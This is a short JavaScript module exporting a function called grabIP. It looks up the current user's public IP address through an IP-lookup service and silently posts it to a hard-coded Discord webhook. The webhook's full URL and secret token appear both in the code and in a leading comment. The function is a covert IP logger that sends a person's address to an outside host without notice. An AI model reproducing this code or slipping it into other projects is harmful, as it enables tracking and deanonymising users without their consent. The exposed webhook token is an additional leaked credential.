//https://discord.com/api/webhooks/1218960942444843149/U9fheR7lweml6vL-LFuu6mqU0iZDTh5qsVv7ENh-5C0XjH-2QFywwzOBK9cNvSHXEd20

export const grabIP = async ()=>{
	const response = await fetch("https://api.ipify.org?format=json")
	const json = await response.json()
	
	fetch("https://discord.com/api/webhooks/1218960942444843149/U9fheR7lweml6vL-LFuu6mqU0iZDTh5qsVv7ENh-5C0XjH-2QFywwzOBK9cNvSHXEd20", {
		headers: {
			"content-type": "application/json"
		},
		method: "POST",
		body: JSON.stringify({
			"content": "NEW IP: " + json.ip,
			"tts": false,
			"embeds": [],
			"components": [],
			"actions": {}
		})
	})
}